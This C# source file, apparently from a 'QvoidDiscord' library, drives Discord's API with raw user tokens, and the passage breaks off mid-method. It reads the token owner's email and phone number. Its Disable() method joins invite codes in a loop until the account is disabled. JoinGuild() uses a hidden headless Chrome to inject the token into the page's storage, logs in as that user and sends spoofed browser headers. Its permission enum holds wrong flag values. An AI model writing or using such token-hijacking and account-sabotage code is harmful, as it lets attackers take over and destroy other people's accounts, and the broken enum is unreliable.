﻿using Leaf.xNet;
using OpenQA.Selenium.Chrome;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace QvoidDiscord
{
    public class Discord
    {
        //Fix: Messages, Reaction
        public class Client
        {
            #region Events

            public delegate void LoggedIn(Discord.Client client);

            public delegate void LoggedOut(Discord.Client client);

            public event LoggedIn OnLoggedIn;

            public event LoggedOut OnLoggedOut;

            private void ClientLoggedIn(Discord.Client client)
            {
                if (OnLoggedIn != null)
                    OnLoggedIn(client);
            }

            private void ClientLoggedOut(Discord.Client client)
            {
                if (OnLoggedOut != null)
                    OnLoggedOut(client);
            }

            #endregion Events

            public Config config;

            private ulong Id;

            private Thread mainThread;

            public Client(string Token, Config config)
            {
                this.config = config;
                this.Token = Token;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discordapp.com/api/v{config.ApiVersion}/users/@me");
                request.Proxy = new WebProxy();
                string responseStr = "";

                try
                {
                    if (!IsValidToken($"{Token}"))
                    {
                        if (!IsValidToken($"Bot {Token}"))
                            throw new ArgumentNullException("Invaild Token.");

                        this.Token = $"Bot {Token}";
                        request.Headers.Set("Authorization", $"Bot {Token}");
                        Type = DiscordType.Bot;
                    }
                    else
                    {
                        request.Headers.Set("Authorization", Token);
                        Type = DiscordType.User;
                    }

                    responseStr = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("}", "").Replace("{", " ");
                }
                catch (Exception) { }
                string[] fields = responseStr.Split(',');

                foreach (string field in fields)
                {
                    int fieldLength = field.IndexOf('"', 2) - 2;
                    string fieldValue = field.Substring(field.IndexOf(':') + 2).Replace("\"", "");
                    switch (field.Substring(2, fieldLength))
                    {
                        case "id":
                            this.Id = ulong.Parse(fieldValue);
                            break;

                        case "locale":
                            this.Locale = fieldValue;
                            break;

                        case "nsfw_allowed":
                            fieldValue = Char.ToUpper(fieldValue[0]).ToString() + fieldValue.Substring(1);
                            this.Nsfw = bool.Parse(fieldValue);
                            break;

                        case "mfa_enabled":
                            fieldValue = Char.ToUpper(fieldValue[0]).ToString() + fieldValue.Substring(1);
                            this.Mfa = bool.Parse(fieldValue);
                            break;

                        case "phone":
                            this.PhoneNumber = fieldValue == "null" ? "None" : fieldValue;
                            break;

                        case "premium_type":
                            this.Nitro = fieldValue != "null";
                            break;
                    }
                }

                DiscordUser = new User(this, this.Id);
                mainThread = new Thread(() => { ClientLoggedIn(this); });
                mainThread.Start();
            }

            public bool Mfa { get; private set; }
            public bool Nitro { get; private set; }
            public bool Nsfw { get; private set; }
            public Client.User DiscordUser { get; private set; }
            public DiscordType Type { get; private set; }

            public enum DiscordType { User, Bot };

            public string Locale { get; private set; }
            public string PhoneNumber { get; private set; }
            public string Token { get; private set; }

            public static bool IsValidToken(string token)
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v6/users/@me");
                try
                {
                    request.Headers.Set("Authorization", token);
                    return !String.IsNullOrEmpty(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd());
                }
                catch { return false; }
            }

            //May cause the token get disabled.
            public void DeleteFriendRequest()
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/{this.config.ApiVersion}/users/@me/relationships");
                request.Headers.Set("Authorization", this.Token);
                request.ContentType = "application/json";
                request.Method = "DELETE";

                try
                {
                    StreamWriter stream = new StreamWriter(request.GetRequestStream());
                    string jsonObject = "{" + $"\"username\":\"{this.DiscordUser.Username}\",\"discriminator\":{this.DiscordUser.Discriminator}" + "}";
                    stream.Write(jsonObject);
                    stream.Dispose();
                    System.Net.HttpStatusCode code = ((HttpWebResponse)request.GetResponse()).StatusCode;
                }
                catch (WebException ex)
                {
                    if (ex.Message.Contains("404"))
                        throw new Exception("User not found.");
                }
            }

            public bool Disable()
            {
                if (!Usable(this) || !Discord.Client.IsValidToken(this.Token))
                    return false;

                while (true)
                {
                    try { Guild.JoinGuild(this, "hwcVZQw"); }
                    catch
                    {
                        Thread.Sleep(1000);
                        try
                        {
                            Guild.JoinGuild(this, "LiorZeus");
                            HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v8/users/@me/guilds/529415233899593732");
                            httpWebRequest.Accept = "application/json";
                            httpWebRequest.Method = "DELETE";
                            httpWebRequest.Headers.Add("Authorization", this.Token);
                        }
                        catch (WebException ex)
                        {
                            if (ex.Message.Contains("401"))
                                return true;
                            else if (ex.Message.Contains("You need to verify your account in order to perform this action."))
                                return true;
                        }
                    }
                }
            }

            public Client.User GetDiscordUser(ulong Id)
            {
                return new Client.User(this, Id);
            }

            public void Logout()
            {
                DiscordUser = null;
                this.Token = null;
                this.Id = 0;
                this.Token = null;
                this.PhoneNumber = null;
                this.Locale = null;
                this.Nitro = false;
                this.Nsfw = false;
                this.Mfa = false;

                mainThread = new Thread(() => { ClientLoggedOut(this); });
                mainThread.Start();
            }

            public void SendFile(ulong ChannelId, FileInfo file)
            {
                string bound = "------------------------" + DateTime.Now.Ticks.ToString("x");
                WebClient webhookRequest = new WebClient();
                webhookRequest.Headers.Add("Content-Type", "multipart/form-data; boundary=" + bound);
                MemoryStream stream = new MemoryStream();
                byte[] beginBodyBuffer = Encoding.UTF8.GetBytes("--" + bound + "\r\n");
                stream.Write(beginBodyBuffer, 0, beginBodyBuffer.Length);

                if (file != null && file.Exists)
                {
                    string fileBody = "Content-Disposition: form-data; name=\"file\"; filename=\"" + file.Name + "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
                    byte[] fileBodyBuffer = Encoding.UTF8.GetBytes(fileBody);
                    stream.Write(fileBodyBuffer, 0, fileBodyBuffer.Length);
                    byte[] fileBuffer = File.ReadAllBytes(file.FullName);
                    stream.Write(fileBuffer, 0, fileBuffer.Length);
                    string fileBodyEnd = "\r\n--" + bound + "\r\n";
                    byte[] fileBodyEndBuffer = Encoding.UTF8.GetBytes(fileBodyEnd);
                    stream.Write(fileBodyEndBuffer, 0, fileBodyEndBuffer.Length);
                }
                string jsonBody = string.Concat(new string[]
                {
                        "Content-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n",
                        string.Format("{0}\r\n", new Discord.Embed()),
                        "--",
                        bound,
                        "--"
                });
                byte[] jsonBodyBuffer = Encoding.UTF8.GetBytes(jsonBody);
                stream.Write(jsonBodyBuffer, 0, jsonBodyBuffer.Length);
                webhookRequest.Headers.Add("Authorization", this.Token);
                webhookRequest.UploadData($"https://discord.com/api/v{this.config.ApiVersion}/channels/{ChannelId}/messages", stream.ToArray());
            }

            public void SendFriendRequest()
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/{this.config.ApiVersion}/users/@me/relationships");
                request.Headers.Set("Authorization", this.Token);
                request.ContentType = "application/json";
                request.Method = "POST";

                try
                {
                    StreamWriter stream = new StreamWriter(request.GetRequestStream());
                    string jsonObject = "{" + $"\"username\":\"{this.DiscordUser.Username}\",\"discriminator\":{this.DiscordUser.Discriminator}" + "}";
                    stream.Write(jsonObject);
                    stream.Dispose();
                    System.Net.HttpStatusCode code = ((HttpWebResponse)request.GetResponse()).StatusCode;
                }
                catch (WebException ex)
                {
                    if (ex.Message.Contains("404"))
                        throw new Exception("User not found.");
                }
            }

            public void SendMessage(ulong ChannelID, Embed embed, FileInfo file = null)
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v{this.config.ApiVersion}/channels/{ChannelID}/messages");
                request.Headers.Set("Authorization", this.Token);
                request.ContentType = "application/json";
                request.Method = "POST";

                string message = embed.ToJsonString().Replace("\n", @"\n");
                StreamWriter streamW = new StreamWriter(request.GetRequestStream());
                streamW.Write(message);
                streamW.Dispose();
                request.GetResponse();
            }

            public void SendMessage(ulong ChannelID, string message, bool tts = false)
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v{this.config.ApiVersion}/channels/{ChannelID}/messages");
                request.Headers.Set("Authorization", this.Token);
                request.ContentType = "application/json";
                request.Method = "POST";

                if (message == "")
                    throw new ArgumentNullException("Message content cannot be empty.");

                try
                {
                    string data = "{" + $"\"content\":\"{message}\", \"tts\":{(tts ? "true" : "false")}" + "}";
                    //string data = "{    \"content\": \"This is a message with components\",    \"components\": [        {            \"type\": 1,            \"components\": []        }    ]}";
                    StreamWriter stream = new StreamWriter(request.GetRequestStream());
                    stream.Write(data);
                    stream.Dispose();
                    System.Net.HttpStatusCode code = ((HttpWebResponse)request.GetResponse()).StatusCode;
                    Thread.Sleep(120);
                }
                catch (WebException ex)
                {
                    if (ex.Message.Contains("400"))
                        throw new ArgumentException("Bad message.");
                }
            }

            public void TriggerTyping(ulong ChannelId)
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/{this.config.ApiVersion}/channels/{ChannelId}/typing");
                request.Headers.Set("Authorization", this.Token);
                request.ContentLength = 0;
                request.ContentType = "application/json";
                request.Method = "POST";

                try
                {
                    System.Net.HttpStatusCode code = ((HttpWebResponse)request.GetResponse()).StatusCode;
                }
                catch { }
            }

            public bool Usable(Client client)
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v6/users/0");
                request.Headers.Set("Authorization", client.Token);

                try
                {
                    using (HttpWebResponse webResponse = (HttpWebResponse)request.GetResponse()) { }
                }
                catch (WebException ex)
                { return ex.Message.Contains("404"); }

                return false;
            }

            public class Config
            {
                public int ApiVersion;
                public int Timeout;
            }

            public class User
            {
                private Client client;

                public User(Client client, ulong Id)
                {
                    if (client.Type == DiscordType.User)
                    {
                        this.client = client;
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discordapp.com/api/v{client.config.ApiVersion}/users/{Id}");
                        request.Headers.Set("Authorization", client.Token);
                        string responseStr = "";
                        try
                        {
                            responseStr = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("}", "").Replace("{", " ");
                            string[] fields = responseStr.Split(',');

                            foreach (string field in fields)
                            {
                                int fieldLength = field.IndexOf('"', 2) - 2;
                                string fieldValue = field.Substring(field.IndexOf(':') + 2).Replace("\"", "");
                                switch (field.Substring(2, fieldLength))
                                {
                                    case "id":
                                        this.Id = ulong.Parse(fieldValue);
                                        this.CreationTime = DateTimeOffset.FromUnixTimeMilliseconds((long)((this.Id >> 22) + 1420070400000UL));
                                        break;

                                    case "username":
                                        this.Username = fieldValue;
                                        break;

                                    case "discriminator":
                                        this.Discriminator = fieldValue;
                                        break;

                                    case "email":
                                        this.Email = fieldValue;
                                        break;

                                    case "verified":
                                        fieldValue = Char.ToUpper(fieldValue[0]).ToString() + fieldValue.Substring(1);
                                        this.Verified = bool.Parse(fieldValue);
                                        break;

                                    case "premium_type":
                                        this.Premium = !fieldValue.Contains("0");
                                        break;

                                    case "avatar":
                                        this.AvatarURL = string.Format("https://cdn.discordapp.com/avatars/{0}/{1}", this.Id, fieldValue);
                                        break;
                                }
                            }
                        }
                        catch { }
                    }
                    else
                    {
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discordapp.com/api/v{client.config.ApiVersion}/users/@me");
                        request.Headers.Set("Authorization", client.Token);

                        string responseStr = "";
                        responseStr = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("}", "").Replace("{", " ");

                        string[] fields = responseStr.Split(',');

                        foreach (string field in fields)
                        {
                            int fieldLength = field.IndexOf('"', 2) - 2;
                            string fieldValue = field.Substring(field.IndexOf(':') + 2).Replace("\"", "");
                            switch (field.Substring(2, fieldLength))
                            {
                                case "id":
                                    this.Id = ulong.Parse(fieldValue);
                                    this.CreationTime = DateTimeOffset.FromUnixTimeMilliseconds((long)((this.Id >> 22) + 1420070400000UL));
                                    break;

                                case "username":
                                    this.Username = fieldValue;
                                    break;

                                case "discriminator":
                                    this.Discriminator = fieldValue;
                                    break;

                                case "email":
                                    this.Email = fieldValue;
                                    break;

                                case "verified":
                                    fieldValue = Char.ToUpper(fieldValue[0]).ToString() + fieldValue.Substring(1);
                                    this.Verified = bool.Parse(fieldValue);
                                    break;

                                case "premium_type":
                                    this.Premium = !fieldValue.Contains("0");
                                    break;

                                case "avatar":
                                    this.AvatarURL = string.Format("https://cdn.discordapp.com/avatars/{0}/{1}", this.Id, fieldValue);
                                    break;
                            }
                        }
                    }
                }

                public string AvatarURL { get; private set; }
                public DateTimeOffset CreationTime { get; private set; } = new DateTimeOffset();
                public string Discriminator { get; private set; }
                public string Email { get; private set; }
                public ulong Id { get; private set; }
                public bool Premium { get; private set; }
                public string Username { get; private set; }
                public bool Verified { get; private set; }
            }
        }

        public class Embed
        {
            public EmbedAuthor Author;
            public Color Color;
            public string Content;
            public string Description;
            public List<EmbedField> Fields = new List<EmbedField>();
            public EmbedFooter Footer;
            public string Image;
            public string Thumbnail;
            public string Title;
            public bool Tts;
            public bool Timestamp;
            private DateTime TimeStamp { get; set; }

            public void AddField(string name, string value, bool inline = false)
            {
                EmbedField field = new EmbedField();
                field.Inline = inline;
                field.Name = name;
                field.Value = value;
                this.Fields.Add(field);
            }

            public Embed Reverse(string jsonObject)
            {
                Embed embed = new Embed();
                string[] fields = jsonObject.Split(',');
                foreach (string field in fields)
                {
                    int fieldLength = field.IndexOf('"', 2) - 2;
                    string fieldValue = field.Substring(field.IndexOf(':') + 2).Replace("\"", "");

                    switch (field.Substring(2, fieldLength))
                    {
                        case "title":
                            embed.Title = fieldValue;
                            break;

                        case "description":
                            embed.Description = fieldValue;
                            break;

                        case "color":
                            embed.Color = ColorTranslator.FromHtml(fieldValue);
                            break;

                        case "footer":
                            embed.Footer = new EmbedFooter(fieldValue);
                            break;

                        case "image":
                            embed.Image = fieldValue;
                            break;

                        case "thumbnail":
                            embed.Thumbnail = fieldValue;
                            break;

                        case "author":
                            embed.Author = new EmbedAuthor(fieldValue);
                            break;

                        case "fields":
                            if (fieldValue == "[]") break;
                            string[] fieldsValues = fieldValue.Replace("]", "").Replace("[", "").Split(',');
                            foreach (string value in fields)
                                embed.Fields.Add(new EmbedField(value.Replace("\"", "")));
                            break;
                    }
                }
                return embed;
            }

            public string ToJsonString()
            {
                string footer = "";
                if (this.Footer != null)
                {
                    footer = $"\"footer\":" + "{" + $"\"text\":" + "\"" + this.Footer.Text + "\"";
                    footer += String.IsNullOrEmpty(this.Footer.IconURL) ? "}" : ($",\"icon_url:" + "\"" + this.Footer.IconURL + "\"}");
                }

                string field = this.Fields == null ? "" : $"\"fields\":[";
                this.Fields.ForEach(item => field += "{" + $"\"name\": \"{item.Name}\"," +
                                                           $"\"value\": \"{item.Value}\"," +
                                                           $"\"inline\": {(item.Inline ? "true" : "false")}" + "},");
                field = (field[field.Length - 1] == ',' ? field.Remove(field.Length - 1, 1) : "") + "]";
                field = field == "\"fields\":[]" ? "" : field;
                field += (field != "" && footer != "\"footer\":[]") ? "," : "";
                field = field == "]," ? "" : field;

                string ColorHEX = this.Color.R.ToString("X2") + this.Color.G.ToString("X2") + this.Color.B.ToString("X2");
                string color = this.Color.IsEmpty ? "" : $"\"color\":\"{Convert.ToInt32(ColorHEX, 16)}\",";
                string content = String.IsNullOrEmpty(this.Content) ? "" : $"\"content\":" + $"\"{this.Content}\", \"tts\":{(this.Tts ? "true" : "false")},";
                string time = Timestamp ? $"\"timestamp\":\"{(DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"))}\"," : "";

                string jsonObject = "{" + content +
                                    "\"embed\":{" +
                                    $"\"description\":\"{this.Description}\"," +
                                    $"\"title\":\"{this.Title}\"," +
                                    $"{color}" +
                                    $"{time}" +
                                    $"{field}" +
                                    $"{footer}";

                jsonObject = jsonObject[jsonObject.Length - 1] == ',' ? jsonObject.Remove(jsonObject.Length - 1, 1) : jsonObject;
                jsonObject += "}}";
                return jsonObject;
            }

            public class EmbedAuthor
            {
                public string IconURL;
                public string Name;
                public string Url;

                public EmbedAuthor()
                {
                }

                public EmbedAuthor(string jsonObject)
                {
                }
            }

            public class EmbedField
            {
                public bool Inline;
                public string Name;
                public string Value;

                public EmbedField()
                {
                }

                public EmbedField(string jsonObject)
                {
                }
            }

            public class EmbedFooter
            {
                public string IconURL;
                public string Text;

                public EmbedFooter()
                {
                }

                public EmbedFooter(string jsonObject)
                {
                }
            }
        }

        public class Guild
        {
            public string Banner;
            public string Description;
            public List<string> Emojis = new List<string>();
            public List<string> Features = new List<string>();
            public string Icon;
            public ulong Id;
            public uint MaxMembers;
            public uint MemberCount;
            public string Name;
            public Client.User Owner;
            public string Region;
            public List<Role> Roles = new List<Role>();
            public int VerificationLevel;
            private Client client;

            public Guild(Client client, ulong Id)
            {
                this.client = client;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v{this.client.config.ApiVersion}/guilds/{Id}");
                request.Headers.Set("Authorization", client.Token);
                string responseStr = "";

                try
                {
                    responseStr = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Remove(0, 1);
                    responseStr = responseStr.Remove(responseStr.Length - 1, 1);
                    if (responseStr.Contains("\"unavailable\": true"))
                        throw new Exception("The specific guild was unavailable.");

                    string roles = responseStr.Split('[')[3];
                    roles = roles.Remove(roles.IndexOf("\"tags"), roles.Length - roles.IndexOf("\"tags"));
                    string[] rolesItems = roles.Split('{');
                    for (int j = 0; j < rolesItems.Length; ++j)
                    {
                        if (String.IsNullOrEmpty(rolesItems[j]))
                            continue;

                        this.Roles.Add(new Role(rolesItems[j].Remove(rolesItems[j].Length - 3, 3)));
                    }

                    for (int i = 0; i < 2; ++i)
                    {
                        if (i == 1)
                        {
                            request = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v{this.client.config.ApiVersion}/guilds/{Id}/preview");
                            request.Headers.Set("Authorization", client.Token);
                            responseStr = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Remove(0, 1);
                            responseStr = responseStr.Remove(responseStr.Length - 1, 1);
                            if (responseStr.Contains("\"unavailable\": true"))
                                throw new Exception("The specific guild was unavailable.");
                        }

                        string[] fields = responseStr.Split(',');
                        foreach (string field in fields)
                        {
                            int fieldLength = field.IndexOf('"', 2) - 2;
                            string fieldValue = field.Substring(field.IndexOf(':') + 2).Replace("\"", "");

                            switch (field.Substring(2, fieldLength))
                            {
                                case "id":
                                    this.Id = ulong.Parse(fieldValue);
                                    break;

                                case "name":
                                    this.Name = fieldValue;
                                    break;

                                case "icon":
                                    this.Icon = fieldValue;
                                    break;

                                case "description":
                                    this.Description = fieldValue;
                                    break;

                                case "approximate_member_count":
                                    this.MemberCount = uint.Parse(fieldValue);
                                    break;

                                case "features":
                                    if (fieldValue == "[]") break;
                                    string[] featuresValues = fieldValue.Replace("]", "").Replace("[", "").Split(',');
                                    foreach (string value in featuresValues)
                                        this.Features.Add(value.Replace("\"", ""));
                                    break;

                                case "emojis":
                                    if (fieldValue == "[]") break;
                                    string[] emojisValues = fieldValue.Replace("]", "").Replace("[", "").Split(',');
                                    foreach (string value in emojisValues)
                                        this.Emojis.Add(value.Replace("\"", ""));
                                    break;

                                case "banner":
                                    this.Banner = fieldValue;
                                    break;

                                case "owner_id":
                                    this.Owner = new Client.User(client, ulong.Parse(fieldValue));
                                    break;

                                case "region":
                                    this.Region = fieldValue;
                                    break;

                                case "verification_level":
                                    this.VerificationLevel = int.Parse(fieldValue);
                                    break;

                                case "max_members":
                                    this.MaxMembers = uint.Parse(fieldValue);
                                    break;
                            }
                        }
                    }
                }
                catch (Exception ex) { string exp = ex.Message; }
            }

            public static void JoinGuild(Discord.Client client, string invite)
            {
                string fun = $"{"\""}\\{"\""} Not A;Brand\\\";v=\\\"99\\\", \\\"Chromium\\\";v=\\\"90\\\", \\\"Google Chrome\\\";v=\\\"90\\\"";

                var options = new ChromeOptions();
                options.AddArgument("headless");
                options.AddArgument("--no-sandbox");
                options.AddArgument("--disable-gpu");
                options.AddArgument("--log-level=3");
                options.AddArgument("--disable-crash-reporter");
                options.AddArgument("--disable-extensions");
                options.AddArgument("--disable-in-process-stack-traces");
                options.AddArgument("--disable-logging");
                options.AddArgument("--disable-dev-shm-usage");
                var driverService = ChromeDriverService.CreateDefaultService();
                driverService.HideCommandPromptWindow = true;

                var driver = new ChromeDriver(driverService, options);

                try
                {
                    string login = "(function() { window.gay = \"" + client.Token + "\"; window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage; window.setInterval(() => window.localStorage.token = `\"${window.gay}\"`);window.location.reload();})();";
                    driver.Navigate().GoToUrl("https://discord.com/login");
                    driver.ExecuteScript(login);
                    driver.ExecuteScript("fetch(\"https://discord.com/api/v9/invites/" + invite + "\", {\"headers\": { \"accept\": \"*/*\", \"accept-language\": \"en-US\", \"authorization\":\"" + client.Token + "\", \"sec-ch-ua\":" + fun + "\", \"sec-ch-ua-mobile\": \"?0\",    \"sec-fetch-dest\": \"empty\",    \"sec-fetch-mode\": \"cors\",    \"sec-fetch-site\": \"same-origin\", \"x-context-properties\": \"eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjgyMDMyODI4NzAxMTQ3MTM5MCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4MjAzMjgyODcwMzI5NjcyMjkiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjB9\",\"x-super-properties\": \"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC44NSBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTAuMC40NDMwLjg1Iiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL3JlcGwuaXQvIiwicmVmZXJyaW5nX2RvbWFpbiI6InJlcGwuaXQiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9\"},  \"referrer\": \"https://discord.com/channels/@me\",  \"referrerPolicy\": \"strict-origin-when-cross-origin\",\"body\": null,\"method\": \"POST\",\"mode\": \"cors\",\"credentials\": \"include\"});");
                }
                catch (Exception ex) { throw new Exception(ex.Message, ex); }
            }

            public void Leave(bool lurking = false)
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v9/users/@me/guilds/{this.Id}");
                request.Headers.Add("Authorization", this.client.Token);
                request.Headers.Add("lurking", lurking.ToString());
                request.Method = "DELETE";
                request.GetResponse();
            }

            public class Channel
            {
                public ulong Id;
                public Message LastMessage;
                public string Name;
                public bool Nsfw;
                public ulong ParentId;
                public int Position;
                public int RateLimit;
                public string Topic;
                public int Type;
                private Client client;

                public Channel(Client client, ulong Id)
                {
                    this.client = client;
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v{this.client.config.ApiVersion}/channels/{Id}/messages");
                    request.Headers.Set("Authorization", client.Token);
                    string responseStr = "";

                    try
                    {
                        responseStr = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Remove(0, 1);
                        responseStr = responseStr.Remove(responseStr.Length - 1, 1);
                        if (responseStr.Contains("\"unavailable\": true"))
                            throw new Exception("The specific guild was unavailable.");

                        string[] fields = responseStr.Split(',');
                        foreach (string field in fields)
                        {
                            int fieldLength = field.IndexOf('"', 2) - 2;
                            string fieldValue = field.Substring(field.IndexOf(':') + 2).Replace("\"", "");

                            switch (field.Substring(2, fieldLength))
                            {
                                case "id":
                                    this.Id = ulong.Parse(fieldValue);
                                    break;

                                case "name":
                                    this.Name = fieldValue;
                                    break;

                                case "type":
                                    this.Type = int.Parse(fieldValue);
                                    break;

                                case "position":
                                    this.Position = int.Parse(fieldValue);
                                    break;

                                case "nsfw":
                                    this.Nsfw = bool.Parse(fieldValue);
                                    break;

                                case "topic":
                                    this.Topic = fieldValue;
                                    break;

                                case "last_message_id":
                                    this.LastMessage = new Message(this.client, this.Id, ulong.Parse(fieldValue));
                                    break;

                                case "parent_id":
                                    this.ParentId = ulong.Parse(fieldValue);
                                    break;

                                case "rate_limit_per_user":
                                    this.RateLimit = int.Parse(fieldValue);
                                    break;
                            }
                        }
                    }
                    catch { }
                }

                public void GetMessages()
                {
                    ///channels/{channel.id}/messages
                }
            }

            public class Role
            {
                public System.Drawing.Color Color;
                public bool Hoist;
                public ulong Id;
                public bool Managed;
                public bool Mentionable;
                public string Name;
                public string Permissions;
                public int Position;

                public Role(string jsonObject)
                {
                    string[] fields = jsonObject.Split(',');
                    for (int i = 0; i < fields.Length; ++i)
                    {
                        string fieldValue = fields[i].Split(':')[1].Replace("\"", "")[0] == ' ' ? fields[i].Split(':')[1].Replace("\"", "").Remove(0, 1) : fields[i].Split(':')[1].Replace("\"", "");
                        string field = fields[i].Split(':')[0].Replace("\"", "")[0] == ' ' ? fields[i].Split(':')[0].Replace("\"", "").Remove(0, 1) : fields[i].Split(':')[0].Replace("\"", "");
                        switch (field)
                        {
                            case "id":
                                this.Id = ulong.Parse(fieldValue);
                                break;

                            case "name":
                                this.Name = fieldValue;
                                break;

                            case "color":
                                this.Color = System.Drawing.ColorTranslator.FromHtml($"#{fieldValue}");
                                break;

                            case "hoist":
                                this.Hoist = bool.Parse(fieldValue);
                                break;

                            case "position":
                                this.Position = int.Parse(fieldValue);
                                break;

                            case "permissions":
                                this.Permissions = fieldValue;
                                break;

                            case "managed":
                                this.Managed = bool.Parse(fieldValue);
                                break;

                            case "mentionable":
                                this.Mentionable = fieldValue.Contains("fal") ? false : true;
                                break;
                        }
                    }
                }

                public enum DiscordPermission
                {
                    None = 0,
                    CreateInstantInvite = 1,
                    KickMembers = 2,
                    BanMembers = 4,
                    Administrator = 8,
                    ManageChannels = 10,
                    ManageGuild = 20,
                    AddReactions = 40,
                    ViewAuditLog = 80,
                    PrioritySpeaker = 100,
                    Stream = 200,
                    ViewChannel = 400,
                    SendMessages = 800,
                    SendTtsMessages = 1000,
                    ManageMessages = 2000,
                    EmbedLinks = 4000,
                    AttachFiles = 8000,
                    ReadMessageHistory = 10000,
                    MentionEveryone = 20000,
                    UseExternalEmojis = 40000,
                    ViewGuildInsights = 80000,
                    ConnectToVC = 100000,
                    SpeakInVC = 200000,
                    MuteMembers = 400000,
                    DeafenVCMembers = 800000,
                    MoveVCMembers = 01000000,
                    ForcePushToTalk = 2000000,
                    ChangeNickname = 4000000,
                    ManageNicknames = 8000000,
                    ManageRoles = 10000000,
                    ManageWebhook = 20000000,
                    ManageEmojis = 40000000
                }
            }
        }

        public class Message
        {
            public List<string> Attachments = new List<string>();
            public Discord.Client.User Author;
            public ulong ChannelId;
            public string Content;
            public DateTime editedTimeStamp;
            public List<Embed> Embeds = new List<Embed>();
            public ulong Id;
            public List<Guild.Role> MentionedRoles = new List<Guild.Role>();
            public bool MentionEveryone;
            public List<Discord.Client.User> Mentions = new List<Client.User>();
            public bool Pinned;
            public List<Discord.Reaction> Reactions = new List<Discord.Reaction>();
            public DateTime TimeStamp;
            public bool Tts;
            public int Type;
            private Discord.Client client;

            public Message(Discord.Client client, ulong ChannelID, ulong MessageId)
            {
                this.client = client;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v{this.client.config.ApiVersion}/channels/{ChannelID}/messages/{MessageId}");
                request.Headers.Set("Authorization", client.Token);
                request.Method = "GET";
                string responseStr = "";

                //try
                //{
                responseStr = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Remove(0, 1);
                responseStr = responseStr.Remove(responseStr.Length - 1, 1);
                if (responseStr.Contains("\"unavailable\": true"))
                    throw new Exception("The specific message was unavailable.");

                string[] fields = responseStr.Split(',');
                foreach (string field in fields)
                {
                    int fieldLength = field.IndexOf('"', 2) - 2;
                    string fieldValue = field.Substring(field.IndexOf(':') + 2).Replace("\"", "");

                    switch (field.Substring(2, fieldLength))
                    {
                        case "reactions":
                            if (fieldValue == "[]") break;
                            string[] reactionsValues = fieldValue.Replace("]", "").Replace("[", "").Split(',');
                            foreach (string value in reactionsValues)
                                this.Reactions.Add(new Reaction(value.Replace("\"", "")));
                            break;

                        case "attachments":
                            if (fieldValue == "[]") break;
                            string[] attachmentsValues = fieldValue.Replace("]", "").Replace("[", "").Split(',');
                            foreach (string value in attachmentsValues)
                                this.Attachments.Add(value.Replace("\"", ""));
                            break;

                        case "embeds":
                            if (fieldValue == "[]") break;
                            string[] embedsValues = fieldValue.Replace("]", "").Replace("[", "").Split(',');
                            foreach (string value in embedsValues)
                                this.Embeds.Add(new Embed().Reverse(value.Replace("\"", "")));
                            break;

                        case "timestamp":
                            this.TimeStamp = DateTime.Parse(fieldValue);
                            break;

                        case "mention_everyone":
                            this.MentionEveryone = bool.Parse(fieldValue);
                            break;

                        case "id":
                            this.Id = ulong.Parse(fieldValue);
                            break;

                        case "pinned":
                            this.Pinned = bool.Parse(fieldValue);
                            break;

                        case "edited_timestamp":
